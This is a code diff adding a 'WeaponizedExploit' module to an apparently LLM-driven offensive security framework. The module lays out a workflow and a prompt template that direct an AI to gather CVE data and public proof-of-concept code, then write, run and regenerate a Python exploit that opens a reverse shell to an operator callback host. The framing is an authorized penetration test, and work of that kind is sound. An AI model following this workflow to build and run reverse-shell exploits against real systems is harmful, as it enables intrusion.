@@ -86,6 +86,50 @@ class FuzzToExploit(AttackModule):
         }
 
 
+class WeaponizedExploit(AttackModule):
+    name = "WeaponizedExploit"
+    description = "Weaponized CVE-to-exploit: synthesize a Python exploit that verifies vulnerability AND gains code execution (reverse shell to an operator callback host)"
+    target_services = ["http", "https", "ssh", "smb", "microsoft-ds", "rdp", "ms-wbt-server"]
+    target_ports = [80, 443, 22, 445, 3389]
+    required_cves: list[str] = []
+
+    def run(self, ctx: ModuleContext) -> dict[str, Any]:
+        return {
+            "status": "info",
+            "module": self.name,
+            "note": (
+                "Weaponized CVE synthesis. Fetches CVE intel + public PoCs, then prompts the LLM "
+                "to write a Python exploit that both verifies the vulnerability AND gains execution "
+                "via a reverse shell to an operator-supplied callback host. On success the generated "
+                "script prints a canonical COMPROMISE marker so the agent loop can confirm foothold."
+            ),
+            "workflow": [
+                "1. Call search_cve_intel(cve_id) to fetch NVD description, references, and affected versions",
+                "2. Call search_web_exploit(cve_id) to gather public PoCs and exploit code fragments",
+                "3. Use write_python_file to save the weaponized exploit (target-locked to ctx.target_ip; reverse shell connects only to the operator callback host passed as --callback-host/--callback-port)",
+                "4. Use run_python_file with --target ctx.target_ip --port <service_port> --callback-host <operator_cb> --callback-port <operator_cb_port>",
+                "5. On success the script prints the canonical marker: 'COMPROMISE: reverse_shell_established target=<ip> callback=<cb_host>:<cb_port>'",
+                "6. If verification fails, feed stderr back to the LLM and regenerate with mutated parameters (mutate_exploit)",
+            ],
+            "prompt_template": (
+                "You are an exploit developer in an authorized pentest against a single owned target. "
+                "Based on the CVE details and PoC fragments below, write a COMPLETE weaponized Python "
+                "exploit that (1) verifies the target is vulnerable, AND (2) gains code execution by "
+                "establishing a reverse shell to an operator-controlled callback host. Constraints: "
+                "use only standard library imports (socket, ssl, http, urllib, struct, json, base64, "
+                "hashlib, subprocess, os, sys, threading). The script MUST accept --target <ip> "
+                "--port <port> --callback-host <operator_cb_ip> --callback-port <operator_cb_port> "
+                "arguments. It MUST only ever connect to --target (the single authorized target IP) "
+                "and to --callback-host (the operator's own listener). It MUST NOT connect to any "
+                "other host. On successful reverse-shell establishment, print EXACTLY: "
+                "'COMPROMISE: reverse_shell_established target=<target> callback=<cb_host>:<cb_port>'. "
+                "On failure, print a clear 'VULN_NOT_CONFIRMED' line with the reason. Do NOT cause "
+                "denial of service; the exploit must be non-destructive to target availability."
+            ),
+            "expected_shell_type": "reverse",
+        }
+
+
 # ---------------------------------------------------------------------------
 # Registry
 # ---------------------------------------------------------------------------
